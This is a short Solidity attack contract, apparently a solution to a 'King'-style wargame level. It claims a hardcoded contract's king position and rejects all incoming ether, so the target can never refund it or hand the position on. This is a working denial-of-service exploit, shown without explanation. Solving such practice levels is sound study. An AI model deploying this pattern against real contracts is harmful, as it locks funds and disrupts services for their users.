

contract KingPin {

    address public king = 0x7d8505478a11C75B6db7EeB5C2fb5C7576D2b01F;
    address public moe;

    constructor() {
        moe = msg.sender;
    }

    function becomeKing() public payable {
        (bool sent, bytes memory data) = king.call{value: msg.value}("");
        require(sent);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        payable(moe).transfer(msg.value);
        revert();
    }

    fallback() external payable {
        revert();
    }
}